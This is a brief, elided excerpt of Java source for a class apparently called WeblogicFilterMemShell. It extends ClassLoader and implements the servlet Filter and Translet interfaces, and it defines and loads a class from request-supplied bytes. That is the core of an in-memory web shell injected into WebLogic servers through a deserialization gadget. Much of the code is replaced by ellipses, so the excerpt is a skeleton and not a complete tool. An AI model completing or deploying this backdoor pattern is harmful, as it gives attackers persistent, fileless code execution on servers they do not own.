...
public class WeblogicFilterMemShell extends ClassLoader implements Filter, Translet {
    ...
    public WeblogicFilterMemShell(ClassLoader loader){
        super(loader);
    }
                ...
                if (value!=null){
                    ...
                    if (data != null && data.length > 0){
                        if (payloadClass == null) {
                            ...
                            payloadClass =  new WeblogicFilterMemShell(loader).defineClass(data,0,data.length);
                        } else {
